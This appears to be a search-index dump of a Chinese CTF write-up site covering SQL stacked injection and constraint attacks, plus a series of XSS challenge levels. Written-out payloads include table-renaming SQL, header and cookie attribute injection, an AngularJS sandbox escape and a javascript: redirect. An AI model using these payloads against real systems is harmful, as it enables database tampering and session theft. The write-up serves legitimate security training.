<p></p>"},{"location":"Web/Chapter8/8-6/","title":"\u7ea6\u675f\u653b\u51fb","text":""},{"location":"Web/Chapter8/8-6/#\u7ea6\u675f\u653b\u51fb","title":"\u7ea6\u675f\u653b\u51fb","text":"<p>\u9875\u9762\u662f\u767b\u5f55\u9875\u9762\uff0c\u63d0\u793a\u662f SQL \u7ea6\u675f\u653b\u51fb</p> <p>SQL \u4e2d\u6267\u884c\u5b57\u7b26\u4e32\u5904\u7406\u65f6\uff0c\u5b57\u7b26\u4e32\u672b\u5c3e\u7684\u7a7a\u683c\u7b26\u5c06\u4f1a\u88ab\u5220\u9664\uff0c<code>'admin'</code> \u7b49\u4e8e <code>'admin   '</code></p> <p></p> <p>\u4e86\u89e3\u4e86\u8fd9\u4e2a\u539f\u7406\uff0c\u6211\u4eec\u53bb\u6ce8\u518c\u8d26\u53f7</p> <p></p> <p>\u8fd9\u91cc\u5bc6\u7801\u4e00\u5b9a\u8981\u7b26\u5408\u89c4\u5219\u624d\u80fd\u6ce8\u518c\u6210\u529f</p> <p></p> <p>\u7528\u6211\u4eec\u521a\u521a\u6ce8\u518c\u7684\u8d26\u53f7\u767b\u5f55</p> <p></p> <p>\u6210\u529f\u62ff\u5230 flag</p> <p></p>"},{"location":"Web/Chapter8/8-7/","title":"\u5806\u53e0\u6ce8\u5165","text":""},{"location":"Web/Chapter8/8-7/#\u5806\u53e0\u6ce8\u5165","title":"\u5806\u53e0\u6ce8\u5165","text":"<p>\u6b63\u5e38\u8f93\u5165</p> <p></p> <p>\u7206\u7834\u6d4b fuzz</p> <p></p> <p>\u53d1\u73b0 <code>;</code> \u6ca1\u6709\u8fc7\u6ee4\uff0c\u53ef\u4ee5\u5806\u53e0\u6ce8\u5165</p> <p></p> <p>\u6210\u529f\u7206\u51fa\u6570\u636e\u5e93</p> <pre><code>11;show database;\n</code></pre> <p></p> <p>\u8f93\u5165\u5b57\u7b26\u5219\u6ca1\u6709\u56de\u663e\u63a8\u6d4b\u540e\u7aef\u4f7f\u7528\u4e86 <code>||</code></p> <p>\u5728 SQL \u4e2d <code>||</code> \u7528\u4e8e\u8fde\u63a5\u5b57\u7b26\uff0c\u4f46\u8fd9\u91cc\u5e94\u8be5\u662f\u5c06 <code>||</code> \u5f53\u4f5c\u4e86\u8fd0\u7b97\u7b26\u800c\u4e0d\u662f\u8fde\u63a5\u7b26</p> <p></p> <p></p> <p>\u63d2\u5165\u6570\u5b57\u6ca1\u4e8b\uff0c\u4f46\u5982\u679c\u662f\u4e0d\u5b58\u5728\u7684\u5b57\u7b26\u5219\u62a5\u9519</p> <p></p> <p>\u6240\u4ee5\u601d\u8def\u5c31\u662f\u7528\u6570\u5b57\u627e flag\uff0c\u540c\u65f6\u4fee\u6539\u914d\u7f6e\u5c06 || \u5f53\u4f5c\u8fde\u63a5\u7b26</p> <pre><code>1;set sql_mode=PIPES_AS_CONCAT;select 1\n</code></pre> <p></p>"},{"location":"Web/Chapter8/8-8/","title":"set sql_mode=PIPES_AS_CONCAT \u4fee\u6539 || \u4e3a\u8fde\u63a5\u7b26","text":""},{"location":"Web/Chapter8/8-8/#set-sql_modepipes_as_concat-\u4fee\u6539--\u4e3a\u8fde\u63a5\u7b26","title":"set sql_mode=PIPES_AS_CONCAT \u4fee\u6539 || \u4e3a\u8fde\u63a5\u7b26","text":"<p>\u6b63\u5e38\u8f93\u5165</p> <p></p> <p>\u7206\u7834\u6d4b fuzz</p> <p></p> <p>\u53d1\u73b0 <code>;</code> \u6ca1\u6709\u8fc7\u6ee4\uff0c\u53ef\u4ee5\u5806\u53e0\u6ce8\u5165</p> <p></p> <p>\u6210\u529f\u7206\u51fa\u6570\u636e\u5e93</p> <pre><code>11;show database;\n</code></pre> <p></p> <p>\u8f93\u5165\u5b57\u7b26\u5219\u6ca1\u6709\u56de\u663e\u63a8\u6d4b\u540e\u7aef\u4f7f\u7528\u4e86 <code>||</code></p> <p>\u5728 SQL \u4e2d <code>||</code> \u7528\u4e8e\u8fde\u63a5\u5b57\u7b26\uff0c\u4f46\u8fd9\u91cc\u5e94\u8be5\u662f\u5c06 <code>||</code> \u5f53\u4f5c\u4e86\u8fd0\u7b97\u7b26\u800c\u4e0d\u662f\u8fde\u63a5\u7b26</p> <p></p> <p></p> <p>\u63d2\u5165\u6570\u5b57\u6ca1\u4e8b\uff0c\u4f46\u5982\u679c\u662f\u4e0d\u5b58\u5728\u7684\u5b57\u7b26\u5219\u62a5\u9519</p> <p></p> <p>\u6240\u4ee5\u601d\u8def\u5c31\u662f\u7528\u6570\u5b57\u627e flag\uff0c\u540c\u65f6\u4fee\u6539\u914d\u7f6e\u5c06 || \u5f53\u4f5c\u8fde\u63a5\u7b26</p> <pre><code>1;set sql_mode=PIPES_AS_CONCAT;select 1\n</code></pre> <p></p>"},{"location":"Web/Chapter8/8-9/","title":"rename()+alter() \u6539\u8868\u7ed5\u8fc7","text":""},{"location":"Web/Chapter8/8-9/#renamealter-\u6539\u8868\u7ed5\u8fc7","title":"rename()+alter() \u6539\u8868\u7ed5\u8fc7","text":"<p>\u6d4b\u8bd5\u662f Get \u578b\u6570\u5b57\u6ce8\u5165</p> <p></p> <p>fuzz \u53d1\u73b0\u6ca1\u6709\u8fc7\u6ee4 <code>;</code>\uff0c\u4f7f\u7528\u5806\u53e0\u6ce8\u5165\u7206\u5e93\u7206\u8868</p> <pre><code>1'; show databases;\n</code></pre> <p></p> <p>\u7206\u8868\u53d1\u73b0\u6709\u4e24\u4e2a</p> <pre><code>1'; show tables;\n</code></pre> <p></p> <p>\u67e5\u6570\u5b57\u8868\u9700\u8981\u7528\u53cd\u5f15\u53f7 `` \u5305\u88f9\u8d77\u6765\uff0c\u5728\u91cc\u9762\u53d1\u73b0 flag</p> <pre><code>1'; show columns from `1919810931114514`; #\n</code></pre> <p></p> <p>\u5728 <code>words</code> \u8868\u4e2d\u53d1\u73b0\u4e24\u4e2a\u5b57\u6bb5</p> <pre><code>1'; show columns from words; #\n</code></pre> <p></p> <p>\u6b63\u5e38\u5e94\u7528\u6267\u884c\u7684\u67e5\u8be2\u7c7b\u4f3c</p> <pre><code>SELECT * FROM words WHERE id = '[\u7528\u6237\u8f93\u5165]';        # \u8fd4\u56de\u7ed3\u679c\u4f1a\u4ee5\u8868\u683c\u5f62\u5f0f\u663e\u793a words \u8868\u4e2d id \u5339\u914d\u7684\u8bb0\u5f55\n</code></pre> <p>\u5728 fuzz \u4e2d\u53d1\u73b0\u6ca1\u6709\u7981\u7528 <code>rename</code> \u548c <code>alter</code>\uff0c\u90a3\u4e48\u5c31\u53ef\u4ee5\u6539\u8868\u66ff\u6362\u62ff\u5230\u6211\u4eec\u60f3\u8981\u7684 flag</p> <p>\u9996\u5148\u5c06 <code>words</code> \u6539\u4e3a\u522b\u7684\u8868\u540d</p> <pre><code>rename table words to suc2es2;\n</code></pre> <p>\u540c\u65f6\u5c06\u6570\u5b57\u8868\u6539\u4e3a <code>words</code></p> <pre><code>rename table `1919810931114514` to words;\n</code></pre> <p>\u56e0\u4e3a\u67e5\u8be2\u7684\u662f <code>id</code> \u5b57\u6bb5\uff0c\u6570\u5b57\u8868\u6ca1\u6709\uff0c\u6240\u4ee5\u8981\u6dfb\u52a0\u4e00\u4e2a</p> <pre><code>alter table words add id int unsigned not NULL auto_increment primary key;\n</code></pre> <p>\u5c06 <code>flag</code> \u5b57\u6bb5\u6539\u4e3a <code>data</code></p> <pre><code>alter table words change flag data varchar(100);#\n</code></pre> <p>\u6267\u884c\u4e0a\u8ff0 payload \u540e\uff0c\u53ea\u9700\u8f93\u5165 1\uff0c\u5c31\u4f1a\u6267\u884c</p> <pre><code>SELECT * FROM words WHERE id = '1';\n</code></pre> <p></p>"},{"location":"Web/Chapter9/9-1/","title":"\u5b58\u50a8\u578b XSS","text":""},{"location":"Web/Chapter9/9-1/#\u5b58\u50a8\u578b-xss","title":"\u5b58\u50a8\u578b XSS","text":"<p>\u7559\u8a00\u529f\u80fd\u7f51\u9875\uff0c\u5148\u8f93\u5165\u6b63\u5e38\u6570\u636e\u6d4b\u8bd5</p> <p></p> <p>\u88ab\u63d2\u5165\u5230\u4e86\u7f51\u9875\u4e2d</p> <p></p> <p>\u8f93\u5165\u6076\u610f XSS \u5f39\u7a97\u4ee3\u7801</p> <p></p> <p>\u6ca1\u6709\u89e6\u53d1\uff0c\u9700\u8981\u5207\u6362\u7528\u6237\u8bbf\u95ee</p> <p>\u5b98\u65b9\u63a8\u8350\u7684\u662f\u4f7f\u7528\u7b2c\u4e09\u65b9 XSS \u63a5\u6536\u5e73\u53f0</p> <p>\u8fd9\u91cc\u76f4\u63a5\u8bbf\u95ee\u7ba1\u7406\u5458\u540e\u53f0\uff0c\u5bc6\u7801\u662f 011be4d65feac1a8\uff08\u73af\u5883\u6709\u95ee\u9898\u626b\u4e0d\u51fa\u4e00\u4e2a sql \u6587\u4ef6\u4e86\uff09</p> <p></p> <p>\u767b\u5f55\u540e\u53f0\u6709\u89e6\u53d1\u4e86\u5f39\u7a97</p> <p></p> <p>\u6211\u4eec\u63d2\u5165\u83b7\u53d6 cookie \u503c\u7684\u6076\u610f\u811a\u672c</p> <p></p> <p>\u518d\u6b21\u767b\u5f55\u62ff\u5230\u4e86 flag</p> <p></p>"},{"location":"Web/Chapter9/9-10/","title":"Referer XSS","text":""},{"location":"Web/Chapter9/9-10/#referer-xss","title":"Referer XSS","text":"<p>\u7b2c\u5341\u4e00\u5173</p> <p>\u770b\u4e00\u4e0b\u6e90\u7801</p> <pre><code>&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;\n&lt;head&gt;\n&lt;meta http-equiv=\"content-type\" content=\"text/html;charset=utf-8\"&gt;\n&lt;script&gt;\nwindow.alert = function()  \n{     \nconfirm(\"\u5b8c\u6210\u7684\u4e0d\u9519\uff01\");\n window.location.href=\"level12.php?keyword=good job!\"; \n}\n&lt;/script&gt;\n&lt;title&gt;\u6b22\u8fce\u6765\u5230level11&lt;/title&gt;\n&lt;/head&gt;\n&lt;body&gt;\n&lt;h1 align=center&gt;\u6b22\u8fce\u6765\u5230level11&lt;/h1&gt;\n&lt;?php \nini_set(\"display_errors\", 0);\n$str = $_GET[\"keyword\"];\n$str00 = $_GET[\"t_sort\"];\n$str11=$_SERVER['HTTP_REFERER'];    // \u63a5\u6536 Referer \u5b57\u6bb5\n$str22=str_replace(\"&gt;\",\"\",$str11);\n$str33=str_replace(\"&lt;\",\"\",$str22);\necho \"&lt;h2 align=center&gt;\u6ca1\u6709\u627e\u5230\u548c\".htmlspecialchars($str).\"\u76f8\u5173\u7684\u7ed3\u679c.&lt;/h2&gt;\".'&lt;center&gt;\n&lt;form id=search&gt;\n&lt;input name=\"t_link\"  value=\"'.'\" type=\"hidden\"&gt;\n&lt;input name=\"t_history\"  value=\"'.'\" type=\"hidden\"&gt;\n&lt;input name=\"t_sort\"  value=\"'.htmlspecialchars($str00).'\" type=\"hidden\"&gt;\n&lt;input name=\"t_ref\"  value=\"'.$str33.'\" type=\"hidden\"&gt;\n&lt;/form&gt;\n&lt;/center&gt;';\n?&gt;\n&lt;center&gt;&lt;img src=level11.png&gt;&lt;/center&gt;\n&lt;?php \necho \"&lt;h3 align=center&gt;payload\u7684\u957f\u5ea6:\".strlen($str).\"&lt;/h3&gt;\";\n?&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre> <p>\u8fc7\u6ee4\u4e86 <code>&lt;&gt;</code>\uff0c\u4e0d\u80fd\u76f4\u63a5\u63d2\u5165 payload\uff0c\u4f46\u662f\u6ca1\u6709\u8fc7\u6ee4 <code>\"\"</code> \u8003\u8651\u4e0b\u4e8b\u4ef6\u7ed5\u8fc7</p> <pre><code>Referer: \" onclick=javascript:alert() type=\"text\n</code></pre> <p></p> <p>\u70b9\u51fb\u5f39\u7a97</p> <p></p>"},{"location":"Web/Chapter9/9-11/","title":"User-Agent XSS","text":""},{"location":"Web/Chapter9/9-11/#user-agent-xss","title":"User-Agent XSS","text":"<p>\u7b2c\u5341\u4e8c\u5173</p> <p>\u67e5\u770b\u6e90\u4ee3\u7801\u53d1\u73b0\u8fd9\u6b21\u63d2\u5165\u7684\u662f <code>User-Agent</code> \u5934</p> <p></p> <p>\u7ee7\u7eed\u4f7f\u7528\u4e0a\u4e00\u5173\u7684 payload</p> <pre><code>User-Agent: \" onclick=javascript:alert() type=\"text\n</code></pre> <p></p> <p>\u6210\u529f\u5f39\u7a97</p> <p></p> <p>\u770b\u4e00\u4e0b\u6e90\u4ee3\u7801</p> <pre><code>&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;\n&lt;head&gt;\n&lt;meta http-equiv=\"content-type\" content=\"text/html;charset=utf-8\"&gt;\n&lt;script&gt;\nwindow.alert = function()  \n{     \nconfirm(\"\u5b8c\u6210\u7684\u4e0d\u9519\uff01\");\n window.location.href=\"level13.php?keyword=good job!\"; \n}\n&lt;/script&gt;\n&lt;title&gt;\u6b22\u8fce\u6765\u5230level12&lt;/title&gt;\n&lt;/head&gt;\n&lt;body&gt;\n&lt;h1 align=center&gt;\u6b22\u8fce\u6765\u5230level12&lt;/h1&gt;\n&lt;?php \nini_set(\"display_errors\", 0);\n$str = $_GET[\"keyword\"];\n$str00 = $_GET[\"t_sort\"];\n$str11=$_SERVER['HTTP_USER_AGENT'];     // \u63a5\u6536 User-Agent\n$str22=str_replace(\"&gt;\",\"\",$str11);\n$str33=str_replace(\"&lt;\",\"\",$str22);\necho \"&lt;h2 align=center&gt;\u6ca1\u6709\u627e\u5230\u548c\".htmlspecialchars($str).\"\u76f8\u5173\u7684\u7ed3\u679c.&lt;/h2&gt;\".'&lt;center&gt;\n&lt;form id=search&gt;\n&lt;input name=\"t_link\"  value=\"'.'\" type=\"hidden\"&gt;\n&lt;input name=\"t_history\"  value=\"'.'\" type=\"hidden\"&gt;\n&lt;input name=\"t_sort\"  value=\"'.htmlspecialchars($str00).'\" type=\"hidden\"&gt;\n&lt;input name=\"t_ua\"  value=\"'.$str33.'\" type=\"hidden\"&gt;\n&lt;/form&gt;\n&lt;/center&gt;';\n?&gt;\n&lt;center&gt;&lt;img src=level12.png&gt;&lt;/center&gt;\n&lt;?php \necho \"&lt;h3 align=center&gt;payload\u7684\u957f\u5ea6:\".strlen($str).\"&lt;/h3&gt;\";\n?&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre>"},{"location":"Web/Chapter9/9-12/","title":"Cookie XSS","text":""},{"location":"Web/Chapter9/9-12/#cookie-xss","title":"Cookie XSS","text":"<p>\u7b2c\u5341\u4e09\u5173</p> <p>\u67e5\u770b\u6e90\u4ee3\u7801\u53d1\u73b0\u8fd9\u6b21\u503c\u662f <code>t_cook</code>\uff0c\u731c\u6d4b\u4e3a <code>cookie</code></p> <p></p> <p>\u66f4\u6539 <code>cookie</code> \u4e3a\u4e0a\u4e00\u5173\u7684 payload\uff0c\u7136\u540e\u5237\u65b0\u7f51\u9875\u5c31\u80fd\u770b\u5230\u6846\u4e86</p> <pre><code>\" onclick=javascript:alert() type=\"text\n</code></pre> <p></p> <p>\u6210\u529f\u5f39\u7a97</p> <p></p> <p>\u770b\u4e00\u4e0b\u6e90\u4ee3\u7801</p> <pre><code>&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;\n&lt;head&gt;\n&lt;meta http-equiv=\"content-type\" content=\"text/html;charset=utf-8\"&gt;\n&lt;script&gt;\nwindow.alert = function()  \n{     \nconfirm(\"\u5b8c\u6210\u7684\u4e0d\u9519\uff01\");\n window.location.href=\"level14.php\"; \n}\n&lt;/script&gt;\n&lt;title&gt;\u6b22\u8fce\u6765\u5230level13&lt;/title&gt;\n&lt;/head&gt;\n&lt;body&gt;\n&lt;h1 align=center&gt;\u6b22\u8fce\u6765\u5230level13&lt;/h1&gt;\n&lt;?php \nsetcookie(\"user\", \"call me maybe?\", time()+3600);\nini_set(\"display_errors\", 0);\n$str = $_GET[\"keyword\"];\n$str00 = $_GET[\"t_sort\"];\n$str11=$_COOKIE[\"user\"];\n$str22=str_replace(\"&gt;\",\"\",$str11);\n$str33=str_replace(\"&lt;\",\"\",$str22);\necho \"&lt;h2 align=center&gt;\u6ca1\u6709\u627e\u5230\u548c\".htmlspecialchars($str).\"\u76f8\u5173\u7684\u7ed3\u679c.&lt;/h2&gt;\".'&lt;center&gt;\n&lt;form id=search&gt;\n&lt;input name=\"t_link\"  value=\"'.'\" type=\"hidden\"&gt;\n&lt;input name=\"t_history\"  value=\"'.'\" type=\"hidden\"&gt;\n&lt;input name=\"t_sort\"  value=\"'.htmlspecialchars($str00).'\" type=\"hidden\"&gt;\n&lt;input name=\"t_cook\"  value=\"'.$str33.'\" type=\"hidden\"&gt;\n&lt;/form&gt;\n&lt;/center&gt;';\n?&gt;\n&lt;center&gt;&lt;img src=level13.png&gt;&lt;/center&gt;\n&lt;?php \necho \"&lt;h3 align=center&gt;payload\u7684\u957f\u5ea6:\".strlen($str).\"&lt;/h3&gt;\";\n?&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre>"},{"location":"Web/Chapter9/9-13/","title":"Angular JS ng-include XSS","text":""},{"location":"Web/Chapter9/9-13/#angular-js-ng-include-xss","title":"Angular JS ng-include XSS","text":"<p>\u7b2c\u5341\u4e94\u5173</p> <p>\u770b\u5230\u8fd9\u4e00\u5173\u7684\u53c2\u6570\u662f\u6587\u4ef6\u540d</p> <p></p> <p>\u67e5\u770b\u6e90\u4ee3\u7801\u53d1\u73b0\u6709 <code>ng-include</code> \u6307\u4ee4\u5f15\u5165\u4e86\u56fe\u7247</p> <p></p> <p>\u5c1d\u8bd5\u6362\u4e3a\u7b2c\u4e00\u5173\u7684\u6587\u4ef6\u6ca1\u6709\u663e\u793a</p> <p></p> <p>\u52a0\u4e0a\u5355\u5f15\u53f7\u540e\u5c31\u6709\u4e86</p> <p></p> <p>\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u7b2c\u4e00\u5173\u7684\u6f0f\u6d1e\uff0c\u5f15\u5165\u540e\u76f4\u63a5\u4f20\u53c2</p> <pre><code>?src='/level1.php?name=&lt;script&gt;alert()&lt;/script&gt;'\n</code></pre> <p>\u53d1\u73b0\u6709\u505a\u8fc7\u6ee4</p> <p></p> <p>\u91c7\u7528\u6807\u7b7e\u7ed5\u8fc7</p> <pre><code>?src='level1.php?name=&lt;img src=abc onerror=alert(1)&gt;'\n</code></pre> <p></p> <p>\u770b\u4e00\u4e0b\u6e90\u4ee3\u7801</p> <pre><code>&lt;html ng-app&gt;\n&lt;head&gt;\n        &lt;meta charset=\"utf-8\"&gt;\n        &lt;script src=\"angular.min.js\"&gt;&lt;/script&gt;\n&lt;script&gt;\nwindow.alert = function()  \n{     \nconfirm(\"\u5b8c\u6210\u7684\u4e0d\u9519\uff01\");\n window.location.href=\"level16.php?keyword=test\"; \n}\n&lt;/script&gt;\n&lt;title&gt;\u6b22\u8fce\u6765\u5230level15&lt;/title&gt;\n&lt;/head&gt;\n&lt;h1 align=center&gt;\u6b22\u8fce\u6765\u5230\u7b2c15\u5173\uff0c\u81ea\u5df1\u60f3\u4e2a\u529e\u6cd5\u8d70\u51fa\u53bb\u5427\uff01&lt;/h1&gt;\n&lt;p align=center&gt;&lt;img src=level15.png&gt;&lt;/p&gt;\n&lt;?php \nini_set(\"display_errors\", 0);\n$str = $_GET[\"src\"];\necho '&lt;body&gt;&lt;span class=\"ng-include:'.htmlspecialchars($str).'\"&gt;&lt;/span&gt;&lt;/body&gt;';\n?&gt;\n</code></pre>"},{"location":"Web/Chapter9/9-14/","title":"\u56de\u8f66\u4ee3\u66ff\u7a7a\u683c\u7ed5\u8fc7","text":""},{"location":"Web/Chapter9/9-14/#\u56de\u8f66\u4ee3\u66ff\u7a7a\u683c\u7ed5\u8fc7","title":"\u56de\u8f66\u4ee3\u66ff\u7a7a\u683c\u7ed5\u8fc7","text":"<p>\u7b2c\u5341\u516d\u5173</p> <p>\u770b\u4e00\u4e0b\u6e90\u4ee3\u7801</p> <pre><code>&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;\n&lt;head&gt;\n&lt;meta http-equiv=\"content-type\" content=\"text/html;charset=utf-8\"&gt;\n&lt;script&gt;\nwindow.alert = function()  \n{     \nconfirm(\"\u5b8c\u6210\u7684\u4e0d\u9519\uff01\");\n window.location.href=\"level17.php?arg01=a&amp;arg02=b\"; \n}\n&lt;/script&gt;\n&lt;title&gt;\u6b22\u8fce\u6765\u5230level16&lt;/title&gt;\n&lt;/head&gt;\n&lt;body&gt;\n&lt;h1 align=center&gt;\u6b22\u8fce\u6765\u5230level16&lt;/h1&gt;\n&lt;?php \nini_set(\"display_errors\", 0);\n$str = strtolower($_GET[\"keyword\"]);\n$str2=str_replace(\"script\",\"&amp;nbsp;\",$str);\n$str3=str_replace(\" \",\"&amp;nbsp;\",$str2);\n$str4=str_replace(\"/\",\"&amp;nbsp;\",$str3);\n$str5=str_replace(\" \",\"&amp;nbsp;\",$str4);\necho \"&lt;center&gt;\".$str5.\"&lt;/center&gt;\";\n?&gt;\n&lt;center&gt;&lt;img src=level16.png&gt;&lt;/center&gt;\n&lt;?php \necho \"&lt;h3 align=center&gt;payload\u7684\u957f\u5ea6:\".strlen($str5).\"&lt;/h3&gt;\";\n?&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre> <p>\u7a7a\u683c\u88ab\u5b9e\u4f53\u5316\u4e86\uff0c\u91c7\u7528\u56de\u8f66\u4ee3\u66ff\uff0cURL \u7f16\u7801\u662f <code>%0A</code></p> <p><code>/</code> \u88ab\u8fc7\u6ee4\u4e86\uff0c\u91c7\u7528\u77ed\u6807\u7b7e\u7ed5\u8fc7</p> <pre><code>?keyword=&lt;svg%0Aonload=alert(1)&gt;\n</code></pre> <p></p>"},{"location":"Web/Chapter9/9-15/","title":"\u77ed\u6807\u7b7e\u7ed5\u8fc7","text":""},{"location":"Web/Chapter9/9-15/#\u77ed\u6807\u7b7e\u7ed5\u8fc7","title":"\u77ed\u6807\u7b7e\u7ed5\u8fc7","text":"<p>\u7b2c\u5341\u516d\u5173</p> <p>\u770b\u4e00\u4e0b\u6e90\u4ee3\u7801</p> <pre><code>&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;\n&lt;head&gt;\n&lt;meta http-equiv=\"content-type\" content=\"text/html;charset=utf-8\"&gt;\n&lt;script&gt;\nwindow.alert = function()  \n{     \nconfirm(\"\u5b8c\u6210\u7684\u4e0d\u9519\uff01\");\n window.location.href=\"level17.php?arg01=a&amp;arg02=b\"; \n}\n&lt;/script&gt;\n&lt;title&gt;\u6b22\u8fce\u6765\u5230level16&lt;/title&gt;\n&lt;/head&gt;\n&lt;body&gt;\n&lt;h1 align=center&gt;\u6b22\u8fce\u6765\u5230level16&lt;/h1&gt;\n&lt;?php \nini_set(\"display_errors\", 0);\n$str = strtolower($_GET[\"keyword\"]);\n$str2=str_replace(\"script\",\"&amp;nbsp;\",$str);\n$str3=str_replace(\" \",\"&amp;nbsp;\",$str2);\n$str4=str_replace(\"/\",\"&amp;nbsp;\",$str3);\n$str5=str_replace(\" \",\"&amp;nbsp;\",$str4);\necho \"&lt;center&gt;\".$str5.\"&lt;/center&gt;\";\n?&gt;\n&lt;center&gt;&lt;img src=level16.png&gt;&lt;/center&gt;\n&lt;?php \necho \"&lt;h3 align=center&gt;payload\u7684\u957f\u5ea6:\".strlen($str5).\"&lt;/h3&gt;\";\n?&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre> <p>\u7a7a\u683c\u88ab\u5b9e\u4f53\u5316\u4e86\uff0c\u91c7\u7528\u56de\u8f66\u4ee3\u66ff\uff0cURL \u7f16\u7801\u662f <code>%0A</code></p> <p><code>/</code> \u88ab\u8fc7\u6ee4\u4e86\uff0c\u91c7\u7528\u77ed\u6807\u7b7e\u7ed5\u8fc7</p> <pre><code>?keyword=&lt;svg%0Aonload=alert(1)&gt;\n</code></pre> <p></p>"},{"location":"Web/Chapter9/9-16/","title":"Angular JS \u6a21\u677f\u6ce8\u5165 XSS","text":""},{"location":"Web/Chapter9/9-16/#angular-js-\u6a21\u677f\u6ce8\u5165-xss","title":"Angular JS \u6a21\u677f\u6ce8\u5165 XSS","text":"<p>\u7b2c\u516d\u5173</p> <p>\u6d4b\u8bd5\u53d1\u73b0\u5b58\u5728\u6a21\u677f\u6ce8\u5165\u6f0f\u6d1e</p> <p></p> <p>\u6784\u9020 payload\uff0c\u53c2\u8003\u6587\u7ae0</p> <pre><code>?username={{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}\n</code></pre> <p><code>'a'.constructor.prototype.charAt=[].join</code></p> <ul> <li><code>'a'.constructor</code> \u83b7\u53d6\u5b57\u7b26\u4e32\u7684\u6784\u9020\u51fd\u6570\uff08String\uff09</li> <li><code>prototype.charAt</code> \u8bbf\u95ee String \u539f\u578b\u4e0a\u7684 charAt \u65b9\u6cd5</li> <li>\u5c06 charAt \u65b9\u6cd5\u66ff\u6362\u4e3a\u6570\u7ec4\u7684 join \u65b9\u6cd5</li> </ul> <p><code>$eval('x=1} } };alert(1)//')</code></p> <ul> <li><code>$eval</code> \u662f AngularJS \u7684\u4e00\u4e2a\u65b9\u6cd5\uff0c\u7528\u4e8e\u6267\u884c\u5b57\u7b26\u4e32\u5f62\u5f0f\u7684\u8868\u8fbe\u5f0f</li> <li>\u6ce8\u5165\u7684\u4ee3\u7801 <code>x=1} } };alert(1)//</code> \u5305\u542b\uff1a</li> <li><code>x=1</code> - \u4e00\u4e2a\u7b80\u5355\u7684\u8d4b\u503c\uff0c\u90e8\u5206\u76ee\u7684\u662f\u4e3a\u4e86\u95ed\u5408\u524d\u9762\u7684\u8bed\u6cd5</li> <li><code>} } }</code> - \u591a\u4e2a\u95ed\u5408\u62ec\u53f7\uff0c\u7528\u4e8e\u9003\u9038 AngularJS \u7684\u6a21\u677f\u89e3\u6790</li> <li><code>;alert(1)</code> - \u5b9e\u9645\u8981\u6267\u884c\u7684\u6076\u610f\u4ee3\u7801</li> <li><code>//</code> - JavaScript \u6ce8\u91ca\uff0c\u7528\u4e8e\u6ce8\u91ca\u6389\u540e\u7eed\u53ef\u80fd\u5b58\u5728\u7684\u4ee3\u7801</li> </ul>"},{"location":"Web/Chapter9/9-17/","title":"DOM \u8df3\u8f6c XSS","text":""},{"location":"Web/Chapter9/9-17/#dom-\u8df3\u8f6c-xss","title":"DOM \u8df3\u8f6c XSS","text":"<p>\u8fdb\u5165\u7f51\u7ad9\u76f4\u63a5\u770b\u6e90\u4ee3\u7801</p> <pre><code>&lt;script&gt;\n        // location.search\uff1a\u83b7\u53d6 URL \u4e2d ? \u540e\u9762\u7684\u90e8\u5206\n        // .split(\"=\")\uff1a\u5c06\u5b57\u7b26\u4e32\u6309\u7167\u7b49\u53f7 = \u5206\u5272\u6210\u6570\u7ec4\n        // \u5982\u679c location.search \u4e3a \"?jumpto=https://www.baidu.com\"\uff0ctarget \u4f1a\u662f\uff1a\n        // [\"?jumpto\", \"https://www.baidu.com\"]\n        var target = location.search.split(\"=\")\n\n        // target[0] \u662f \"?jumpto\"\n        // .slice(1) \u79fb\u9664\u7b2c\u4e00\u4e2a\u5b57\u7b26 ?\uff0c\u53d8\u6210 \"jumpto\"\n        // \u5982\u679c\u7b49\u4e8e \"jumpto\"\uff0c\u5c31\u8fdb\u5165 if \u5757\n        if (target[0].slice(1) == \"jumpto\") {\n            // \u5c06\u6d4f\u89c8\u5668\u91cd\u5b9a\u5411\u5230 target[1]\uff0c\u4e5f\u5c31\u662f https://www.baidu.com\n            location.href = target[1];\n        }\n&lt;/script&gt;\n</code></pre> <p>\u6ce8\u610f\uff01\u5f53\u4f60\u5c06\u7c7b\u4f3c\u4e8e  l<code>ocation.href = \"javascript:alert('xss')\"</code>  \u8fd9\u6837\u7684\u4ee3\u7801\u8d4b\u503c\u7ed9  <code>location.href</code>  \u65f6</p> <p>\u6d4f\u89c8\u5668\u4f1a\u5c06\u5176\u89e3\u91ca\u4e3a\u4e00\u79cd\u7279\u6b8a\u7684 URL \u65b9\u6848\uff0c\u5373 <code>\"javascript:\"</code></p> <p>\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u6d4f\u89c8\u5668\u4f1a\u5c06\u540e\u9762\u7684 JavaScript \u4ee3\u7801\u4f5c\u4e3a URL \u7684\u4e00\u90e8\u5206\u8fdb\u884c\u89e3\u6790\uff0c\u7136\u540e\u6267\u884c\u5b83</p> <p>\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u6784\u9020\u5982\u4e0b\u94fe\u63a5\uff1a\u6267\u884c JS \u8bed\u53e5</p> <pre><code>http://challenge-f42fd52528263d24.sandbox.ctfhub.com:10800/?jumpto=javascript:alert(1)\n</code></pre> <p></p> <p>\u7528 <code>jQuery</code>  \u7684  <code>$.getScript()</code>  \u51fd\u6570\u6765\u5f02\u6b65\u52a0\u8f7d\u5e76\u6267\u884c\u5e73\u53f0\u7684 JS \u811a\u672c\uff0c\u901a\u8fc7 <code>jumpto=javascript:$.getScript()</code></p> <p></p>"},{"location":"Web/Chapter9/9-18/","title":"/ \u4ee3\u66ff\u7a7a\u683c\u7ed5\u8fc7","text":""},{"location":"Web/Chapter9/9-18/#-\u4ee3\u66ff\u7a7a\u683c\u7ed5\u8fc7","title":"/ \u4ee3\u66ff\u7a7a\u683c\u7ed5\u8fc7","text":"<p>\u5229\u7528 <code>/</code> \u4ee3\u66ff\u7a7a\u683c\u7ed5\u8fc7</p> <p>\u200b   </p> 